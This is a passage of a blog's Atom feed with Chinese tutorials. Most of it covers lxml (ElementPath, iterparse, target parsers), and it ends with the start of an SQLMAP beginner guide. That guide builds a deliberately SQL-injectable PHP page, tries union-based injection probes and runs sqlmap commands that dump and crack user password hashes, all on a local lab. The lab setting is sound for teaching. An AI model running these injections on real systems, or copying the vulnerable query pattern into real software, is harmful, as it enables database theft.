class="meta">... </span>    PAR(<span class="string">"And then ..."</span>)</span><br><span class="line"><span class="meta">... </span>  ),</span><br><span class="line"><span class="meta">... </span>  SECTION(</span><br><span class="line"><span class="meta">... </span>    TITLE(<span class="string">"The hog"</span>),</span><br><span class="line"><span class="meta">... </span>    PAR(<span class="string">"Sooner or later ..."</span>)</span><br><span class="line"><span class="meta">... </span>  )</span><br><span class="line"><span class="meta">... </span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(etree.tostring(my_doc, pretty_print=<span class="literal">True</span>))</span><br><span class="line">&lt;p:doc xmlns:p=<span class="string">"http://my.de/fault/namespace"</span>&gt;</span><br><span class="line">  &lt;p:title&gt;The dog and the hog&lt;/p:title&gt;</span><br><span class="line">  &lt;p:section&gt;</span><br><span class="line">    &lt;p:title&gt;The dog&lt;/p:title&gt;</span><br><span class="line">    &lt;p:par&gt;Once upon a time, ...&lt;/p:par&gt;</span><br><span class="line">    &lt;p:par&gt;And then ...&lt;/p:par&gt;</span><br><span class="line">  &lt;/p:section&gt;</span><br><span class="line">  &lt;p:section&gt;</span><br><span class="line">    &lt;p:title&gt;The hog&lt;/p:title&gt;</span><br><span class="line">    &lt;p:par&gt;Sooner or later ...&lt;/p:par&gt;</span><br><span class="line">  &lt;/p:section&gt;</span><br><span class="line">&lt;/p:doc&gt;</span><br></pre></td></tr></table></figure><p>一个例子就是 lxml.html.builder 模块，它为 HTML 提供了一个词汇表。<br>当处理多个名称空间的时候，最好为每个名称空间 URI 定义一个元素生成器。再次注意，上面的例子是怎么样在命名常量里预定义标签生成器的。这会让，把名称空间的所有标记声明放入一个Python模块并从其中导入/使用标记名称常量变得很容易，也避免了输入错误或意外丢失名称空间等陷阱。</p><h3 id="元素路径"><a href="#元素路径" class="headerlink" title="元素路径"></a>元素路径</h3><p>ElementTree 库提供了一个简单的类 XPath 路径语言，成为：ElementPath。主要的区别在于你可以在 ElementPath 表达式中使用 {namespace}tag 记号。然而，像值比较和函数这样的高级特性是没有的。<br>除了支持完整的 XPath 实现，lxml.etree 还可以像 ElementTree 那样的方式来支持 ElementPath 语言，甚至使用了几乎相同的实现。这套 API 提供了4个方法，这些方法你都能在 Elements 和 ElementTrees 中找到：</p><ul><li>iterfind()    — 遍历与路径表达式匹配的所有元素</li><li>findall()      — 返回匹配元素的列表</li><li>find()          — 只返回第一个匹配项</li><li>findtext()   — 返回第一个匹配项的.text内容</li></ul><p>几个例子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>root = etree.XML(<span class="string">"&lt;root&gt;&lt;a x='123'&gt;aText&lt;b/&gt;&lt;c/&gt;&lt;b/&gt;&lt;/a&gt;&lt;/root&gt;"</span>)</span><br></pre></td></tr></table></figure><p>找到某个元素的子元素：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(root.find(<span class="string">"b"</span>))</span><br><span class="line"><span class="literal">None</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(root.find(<span class="string">"a"</span>).tag)</span><br><span class="line">a</span><br></pre></td></tr></table></figure><p>找到树中任何一处的元素：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(root.find(<span class="string">".//b"</span>).tag)</span><br><span class="line">b</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[ b.tag <span class="keyword">for</span> b <span class="keyword">in</span> root.iterfind(<span class="string">".//b"</span>) ]</span><br><span class="line">[<span class="string">'b'</span>, <span class="string">'b'</span>]</span><br></pre></td></tr></table></figure><p>找到有某个特定属性的元素：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(root.findall(<span class="string">".//a[@x]"</span>)[<span class="number">0</span>].tag)</span><br><span class="line">a</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(root.findall(<span class="string">".//a[@y]"</span>))</span><br><span class="line">[]</span><br></pre></td></tr></table></figure><p>在 lxml 3.4 里，有一个新的帮助器（helper），可以为某个元素生成一个结构化的 ElementPath 表达式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>tree = etree.ElementTree(root)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = root[<span class="number">0</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(tree.getelementpath(a[<span class="number">0</span>]))</span><br><span class="line">a/b[<span class="number">1</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(tree.getelementpath(a[<span class="number">1</span>]))</span><br><span class="line">a/c</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(tree.getelementpath(a[<span class="number">2</span>]))</span><br><span class="line">a/b[<span class="number">2</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>tree.find(tree.getelementpath(a[<span class="number">2</span>])) == a[<span class="number">2</span>]</span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure><p>只要树没有被修改，这个路径表达式就代表着一个给定元素的标识符，稍后还是可以使用它来进行 find() 。与 XPath 相比，ElementPath 表达式具有自包含的优势，即使对于使用名称空间的文档也是如此。<br>iter() 方法是一种特例，它在树中只根据名称而不是路径来查找特定的标记。这意味着下面的命令在执行成功的情况下是互相等价的:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(root.find(<span class="string">".//b"</span>).tag)</span><br><span class="line">b</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(next(root.iterfind(<span class="string">".//b"</span>)).tag)</span><br><span class="line">b</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(next(root.iter(<span class="string">"b"</span>)).tag)</span><br><span class="line">b</span><br></pre></td></tr></table></figure><p>注意，<code>.find()</code> 方法在没有匹配到的情况下只返回 None，而另外两个例子会抛出一个 <code>StopIteration</code> 异常。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文内容：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;命名空间&lt;/li&gt;
&lt;li&gt;E-factory 工厂方法&lt;/li&gt;
&lt;li&gt;元素路径&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>lxml.etree tutorial - part six</title>
    <link href="https://pwn4justice.github.io/2019/06/16/lxml-etree-tutorial-part-six/"/>
    <id>https://pwn4justice.github.io/2019/06/16/lxml-etree-tutorial-part-six/</id>
    <published>2019-06-16T15:41:09.000Z</published>
    <updated>2019-07-30T06:11:13.616Z</updated>
    
    <content type="html"><![CDATA[<p>本文内容：</p><ul><li>事件驱动解析</li></ul><a id="more"></a><h3 id="事件驱动解析"><a href="#事件驱动解析" class="headerlink" title="事件驱动解析"></a>事件驱动解析</h3><p>有时候，你所需要的只是某个文档树中的一小块内容，所以此时如果占用内存空间去解析整个树，然后遍历或用完销毁都显得不太划算。lxml.etree 支持使用两个<strong>事件驱动</strong>的<strong>解析器接口</strong>来解决这个问题，一个是在构建一颗树(iterparse)的过程中，同时产生解析器事件，另一个则根本就没有构建树，而是运用了’类SAX的模式’在目标对象上调用了回馈方法。这是一个简单的 iterparse() 示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s_file_like = BytesIO(<span class="string">b"&lt;root&gt;&lt;a&gt;data&lt;/a&gt;&lt;/root&gt;"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> event, element <span class="keyword">in</span> etree.iterparse(s_file_like):</span><br><span class="line"><span class="meta">... </span>    print(<span class="string">"%s, %4s, %s"</span> % (event, element.tag, element.text))</span><br><span class="line"><span class="meta">... </span></span><br><span class="line">end,    a, data</span><br><span class="line">end, root, <span class="literal">None</span></span><br></pre></td></tr></table></figure><p>默认的，iterparse() 仅仅在他解析一个元素对象（element）结束的时候产生事件，但是你可以通过参数 <code>events</code> 来控制这个过程：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>some_obj = BytesIO(<span class="string">b"&lt;root&gt;&lt;a&gt;data&lt;/a&gt;&lt;/root&gt;"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> event, element <span class="keyword">in</span> etree.iterparse(some_obj, events=(<span class="string">"start"</span>, <span class="string">"end"</span>)):</span><br><span class="line"><span class="meta">... </span>    print(<span class="string">"%5s, %4s, %s"</span> % (event, element.tag, element.text))</span><br><span class="line"><span class="meta">... </span></span><br><span class="line">start, root, <span class="literal">None</span></span><br><span class="line">start,    a, data</span><br><span class="line">  end,    a, data</span><br><span class="line">  end, root, <span class="literal">None</span></span><br></pre></td></tr></table></figure><p>注意一点，当 start 事件发生的时候，标签的文本，tail 文本，和子元素都是暂时不必要显示出来的。仅当 end 事件发生后才能白哦秩对应的元素被解析完毕。<br>你也可以通过使用 <code>.clear()</code> 或者修改元素的内容来节省内存。如果你想用较低的内存使用量来解析一个很大的树，那就应该及时清理（clean up）掉这个树中你已经不再会用到的部分：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>some_obj = BytesIO(<span class="string">b"&lt;root&gt;&lt;a&gt;&lt;b&gt;data&lt;/b&gt;&lt;/a&gt;&lt;a&gt;&lt;b/&gt;&lt;/a&gt;&lt;/root&gt;"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> event, element <span class="keyword">in</span> etree.iterparse(some_obj):</span><br><span class="line"><span class="meta">... </span>    <span class="keyword">if</span> element.tag == <span class="string">'b'</span>:</span><br><span class="line"><span class="meta">... </span>            print(element.text)</span><br><span class="line"><span class="meta">... </span>    <span class="keyword">elif</span> element.tag == <span class="string">'a'</span>:</span><br><span class="line"><span class="meta">... </span>            print(<span class="string">"** cleaning up the subtree"</span>)</span><br><span class="line"><span class="meta">... </span>            element.clear()</span><br><span class="line"><span class="meta">... </span></span><br><span class="line">data</span><br><span class="line">** cleaning up the subtree</span><br><span class="line"><span class="literal">None</span>;;这里 a 还没有解析完成，而&lt;b/&gt;解析完成了，b 元素中没有文本节点，故为 <span class="literal">None</span></span><br><span class="line">** cleaning up the subtree;;这里解析到了 &lt;/a&gt;，即 a 解析完成了，故输出 cleaning up...</span><br></pre></td></tr></table></figure><p><code>iterparse()</code> 函数的一个重要使用场景是在解析一个很大的 XML 文件的时候。如，数据库导出来的文件（dump）。大多数情况下，这些 XML 的格式都是仅在根节点下面直接挂着一个主要的数据项元素（main data item element），然后后面都是将这个元素重复几千遍。这种情况下，最好练习使用 <code>lxml.etree</code> 模块来构建树，并且只解析那个一直在被重复的元素，可以使用普通的 tree API 来进行数据提取：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>xml_file = BytesIO(<span class="string">b'''\</span></span><br><span class="line"><span class="string"><span class="meta">... </span>&lt;root&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>    &lt;a&gt;&lt;b&gt;ABCDE&lt;/b&gt;&lt;c&gt;abcde&lt;/c&gt;&lt;/a&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>    &lt;a&gt;&lt;b&gt;---MORE DATA---&lt;/b&gt;&lt;c&gt;---more data---&lt;/c&gt;&lt;/a&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>    &lt;a&gt;&lt;b&gt;UVWXYZ&lt;/b&gt;&lt;c&gt;xyz&lt;/c&gt;&lt;/a&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>&lt;/root&gt;'''</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> _, element <span class="keyword">in</span> etree.iterparse(xml_file, tag=<span class="string">'a'</span>):</span><br><span class="line"><span class="meta">... </span>    print(<span class="string">'%s *** %s'</span> % (element.findtext(<span class="string">'b'</span>), element[<span class="number">1</span>].text))</span><br><span class="line"><span class="meta">... </span>    element.clear()</span><br><span class="line"><span class="meta">... </span></span><br><span class="line">ABCDE *** abcde</span><br><span class="line">---MORE DATA--- *** ---more data---</span><br><span class="line">UVWXYZ *** xyz</span><br></pre></td></tr></table></figure><p>如果基于某些理由，你根本不想构造一颗树，那么 lxml.etree 的目标解析器接口（target parser interface）可以派上用场。它通过调用目标对象的方法来创造一个 SAX-like 对象。通过实现其中一些或者所有的方法，你可以控制产生哪种事件：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="class"><span class="keyword">class</span> <span class="title">ParserTarget</span>:</span></span><br><span class="line"><span class="meta">... </span>    events = []</span><br><span class="line"><span class="meta">... </span>    close_count = <span class="number">0</span></span><br><span class="line"><span class="meta">... </span>    <span class="function"><span class="keyword">def</span> <span class="title">start</span><span class="params">(self, tag, attrib)</span>:</span></span><br><span class="line"><span class="meta">... </span>        self.events.append((<span class="string">"start"</span>, tag, attrib))</span><br><span class="line"><span class="meta">... </span>    <span class="function"><span class="keyword">def</span> <span class="title">close</span><span class="params">(self)</span>:</span></span><br><span class="line"><span class="meta">... </span>        events, self.events = self.events, []</span><br><span class="line"><span class="meta">... </span>        self.close_count += <span class="number">1</span></span><br><span class="line"><span class="meta">... </span>        <span class="keyword">return</span> events</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>parser_target = ParserTarget()</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>parser = etree.XMLParser(target=parser_target)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>events = etree.fromstring(<span class="string">'&lt;root test="true"/&gt;'</span>, parser)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(parser_target.close_count)</span><br><span class="line"><span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> event <span class="keyword">in</span> events:</span><br><span class="line"><span class="meta">... </span>    print(<span class="string">'event: %s - tag: %s'</span> % (event[<span class="number">0</span>], event[<span class="number">1</span>]))</span><br><span class="line"><span class="meta">... </span>    <span class="keyword">for</span> attr, value <span class="keyword">in</span> event[<span class="number">2</span>].items():</span><br><span class="line"><span class="meta">... </span>        print(<span class="string">' * %s = %s'</span> % (attr, value))</span><br><span class="line">event: start - tag: root</span><br><span class="line"> * test = true</span><br></pre></td></tr></table></figure><p>因为你可以随时随意地复用这个解析器和它的目标，所以你应该小心 <code>.close()</code> 方法会将目标重置到可使用的状态（即使在出错情况下也是如此！）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>events = etree.fromstring(<span class="string">'&lt;root test="true"/&gt;'</span>, parser)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(parser_target.close_count)</span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>events = etree.fromstring(<span class="string">'&lt;root test="true"/&gt;'</span>, parser)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(parser_target.close_count)</span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>events = etree.fromstring(<span class="string">'&lt;root test="true"/&gt;'</span>, parser)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(parser_target.close_count)</span><br><span class="line"><span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> event <span class="keyword">in</span> events:</span><br><span class="line"><span class="meta">... </span>    print(<span class="string">'event: %s - tag: %s'</span> % (event[<span class="number">0</span>], event[<span class="number">1</span>]))</span><br><span class="line"><span class="meta">... </span>    <span class="keyword">for</span> attr, value <span class="keyword">in</span> event[<span class="number">2</span>].items():</span><br><span class="line"><span class="meta">... </span>        print(<span class="string">' * %s = %s'</span> % (attr, value))</span><br><span class="line">event: start - tag: root</span><br><span class="line"> * test = true</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文内容：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;事件驱动解析&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>SQLMAP 新手教程（一）</title>
    <link href="https://pwn4justice.github.io/2019/06/11/SQLMAP-%E6%96%B0%E6%89%8B%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>https://pwn4justice.github.io/2019/06/11/SQLMAP-新手教程（一）/</id>
    <published>2019-06-11T15:06:58.000Z</published>
    <updated>2019-07-20T02:33:53.428Z</updated>
    
    <content type="html"><![CDATA[<p>前言：现在的网络安全措施日益健全，尤其是针对像 SQL 注入这样的常见漏洞也变得越来越不常见，或者难以利用，对新手体验/学习都不是很好；而且网络安全法也日益完善，所以目前来说，我认为使用 DVWA 或者 pikachu 这样的平台来熟悉 OWASP TOP 10 以及相关安全工具的应用，是必要且稳妥的。</p><p>本文主要介绍一些 SQLMAP 的简单应用，由于暂时只是测试低级别的 SQL 注入，所以可以自己写一个有 SQL 注入的页面来进行测试，本文就是基于此的。</p><a id="more"></a><h2 id="0x00-环境介绍"><a href="#0x00-环境介绍" class="headerlink" title="0x00 环境介绍"></a>0x00 环境介绍</h2><ul><li>操作系统：Windows 10</li><li>软件：phpStudy v5.2 珍藏版、SQLMAP</li></ul><h2 id="0x01-SQL-注入漏洞页面编写"><a href="#0x01-SQL-注入漏洞页面编写" class="headerlink" title="0x01 SQL 注入漏洞页面编写"></a>0x01 SQL 注入漏洞页面编写</h2><p>在 <code>D:\phpStudy5.2\WWW\</code> 默认的网站根目录下（或者自己新建一个diy目录，记得访问时加上即可），编写以下两个文件：</p><blockquote><p>conn.php            //数据库连接页面</p><p>sqli.php                //漏洞页面</p></blockquote><p><strong>conn.php：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$server = <span class="string">"localhost"</span>;</span><br><span class="line">$username = <span class="string">"your_account"</span>;</span><br><span class="line">$password = <span class="string">"your_password"</span>;</span><br><span class="line">$db = <span class="string">"dvwa"</span>;&lt;!-- 这里采取 dvwa 数据库测试，安装 DVWA 是不必要的，只是不想自己建库/表.. --&gt;</span><br><span class="line"><span class="comment">//create a connection</span></span><br><span class="line">$conn = mysqli_connect($server, $username, $password, $db);</span><br><span class="line"></span><br><span class="line"><span class="comment">//test</span></span><br><span class="line"><span class="keyword">if</span> (!$conn)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"Connect failed! in conn.php, Info: "</span> . mysqli_connect_error());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//echo "Success.";</span></span><br></pre></td></tr></table></figure><p><strong>sqli.php：</strong>这是一个超级简陋的存在 sql 注入的页面，相当于 DVWA 的 LOW 级别吧… :joy:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;Test Sql-injection&lt;/title&gt;</span><br><span class="line">&lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="comment"># method="GET"&gt;</span></span><br><span class="line">&lt;input type=<span class="string">"text"</span> name=<span class="string">"id"</span> /&gt;</span><br><span class="line">&lt;input type=<span class="string">"submit"</span> name=<span class="string">"Submit"</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">"conn.php"</span>);</span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>($_GET[<span class="string">"id"</span>]) )&#123;</span><br><span class="line">$id = $_GET[<span class="string">"id"</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//query from db</span></span><br><span class="line">$query = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '$id';"</span>;</span><br><span class="line">$result = mysqli_query($conn, $query);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( mysqli_num_rows($result) &gt; <span class="number">0</span> )&#123;</span><br><span class="line"><span class="comment">//Get the data</span></span><br><span class="line"><span class="keyword">while</span>($row = $result-&gt;fetch_assoc())&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"first name: "</span> . $row[<span class="string">"first_name"</span>] . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"last name : "</span> . $row[<span class="string">"last_name"</span>]. <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">""</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">mysqli_close($conn);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;!-- 此页面来熟悉 SQLMAP 的使用基本上没有什么阻碍 --&gt;</span><br></pre></td></tr></table></figure><p><strong>正常访问页面</strong></p><p><img src="ok.jpg" alt="ok"></p><br><p><strong>出错情况</strong></p><p>使用 <code>1&#39; and 1=1 --</code></p><p><img src="ok2.jpg" alt="ok2"></p><p><br>使用 <code>1&#39; and 1=2 --</code></p><p><img src="err.jpg" alt="err"></p><p><br>使用 <code>1&#39; union select 1 --</code></p><p><img src="err2.jpg" alt="err2"></p><p><br>使用 <code>1&#39; union select 1,2 --</code></p><p><img src="err3.jpg" alt="err3"></p><p><br><strong>注：</strong></p><p>1.注释时，<code>--</code> 后面要加一个或多个空格</p><p>2.select 1,2 这种写法只在 MySQL 里比较好使，SQL Server 或者 Oracle 都应该使用 select null,null[…] 这种写法</p><p><em>这样可以简单地测试出是有 SQL 注入漏洞的，下面就可以使用 SQLMAP 这个神器了</em></p><br><h2 id="0x02-使用-SQLMAP-进行测试"><a href="#0x02-使用-SQLMAP-进行测试" class="headerlink" title="0x02 使用 SQLMAP 进行测试"></a>0x02 使用 SQLMAP 进行测试</h2><p>基本使用：<code>sqlmap.py -u &quot;your_url&quot; [options] ------ 不加参数时默认只判断有没有注入点</code></p><br><h3 id="使用-SQLMAP-查看数据库"><a href="#使用-SQLMAP-查看数据库" class="headerlink" title="使用 SQLMAP 查看数据库"></a>使用 SQLMAP 查看数据库</h3><blockquote><p>sqlmap.py -u “<a href="http://localhost/diy/sqli.php?id=1&quot;" target="_blank" rel="noopener">http://localhost/diy/sqli.php?id=1&quot;</a> --dbs</p></blockquote><p><img src="dbs.jpg" alt="dbs"></p><br><h3 id="使用-SQLMAP-查看当前数据库"><a href="#使用-SQLMAP-查看当前数据库" class="headerlink" title="使用 SQLMAP 查看当前数据库"></a>使用 SQLMAP 查看当前数据库</h3><blockquote><p> sqlmap.py -u “<a href="http://localhost/diy/sqli.php?id=1&quot;" target="_blank" rel="noopener">http://localhost/diy/sqli.php?id=1&quot;</a> --current-db</p></blockquote><p><img src="currentdb.jpg" alt="currentdb"></p><br><h3 id="使用-SQLMAP-爆出数据库-dvwa-中的表"><a href="#使用-SQLMAP-爆出数据库-dvwa-中的表" class="headerlink" title="使用 SQLMAP 爆出数据库(dvwa)中的表"></a>使用 SQLMAP 爆出数据库(dvwa)中的表</h3><blockquote><p>sqlmap.py -u “<a href="http://localhost/diy/sqli.php?id=1&quot;" target="_blank" rel="noopener">http://localhost/diy/sqli.php?id=1&quot;</a> --table -D “dvwa”</p></blockquote><p><img src="tables.jpg" alt="dvwa"></p><br><p><strong>如果 -D 不使用 <code>&quot;</code> 则会报错：</strong></p><p><img src="noquote.jpg" alt="noquote"></p><br><h3 id="使用-SQLMAP-爆出表-users-的列"><a href="#使用-SQLMAP-爆出表-users-的列" class="headerlink" title="使用 SQLMAP 爆出表(users)的列"></a>使用 SQLMAP 爆出表(users)的列</h3><blockquote><p>sqlmap.py -u “<a href="http://localhost/diy/sqli.php?id=1&quot;" target="_blank" rel="noopener">http://localhost/diy/sqli.php?id=1&quot;</a> --columns -T “users” -D “dvwa”</p></blockquote><p><img src="columns.jpg" alt="columns"></p><br><h3 id="使用-SQLMAP-破解账户密码值"><a href="#使用-SQLMAP-破解账户密码值" class="headerlink" title="使用 SQLMAP 破解账户密码值"></a>使用 SQLMAP 破解账户密码值</h3><blockquote><p>sqlmap.py -u “<a href="http://localhost/diy/sqli.php?id=1&quot;" target="_blank" rel="noopener">http://localhost/diy/sqli.php?id=1&quot;</a> --dump -C “user,password,user_id” -T “users” -D “dvwa”</p></blockquote><p><img src="crack_md5.jpg" alt="crack_md5"></p><br><p><strong>也可以使用 MD5 网站解密，结果一致</strong></p><p><img src="md5.jpg" alt="md5"></p><br><h3 id="查看-SQLMAP-保存在本地的-LOG-文件"><a href="#查看-SQLMAP-保存在本地的-LOG-文件" class="headerlink" title="查看 SQLMAP 保存在本地的 LOG 文件"></a>查看 SQLMAP 保存在本地的 LOG 文件</h3><blockquote><p>C:\Users\Admin\AppData\Local\sqlmap\output\127.0.0.1</p></blockquote><p><strong>日志文件会保存执行过的命令，以及自动化产生的 payload 方便学习</strong></p><br><p><img src="log.jpg" alt="log"></p><br><p><strong>同时也会保存破解的 MD5 为 csv 文件</strong></p><p><img src="csv.jpg" 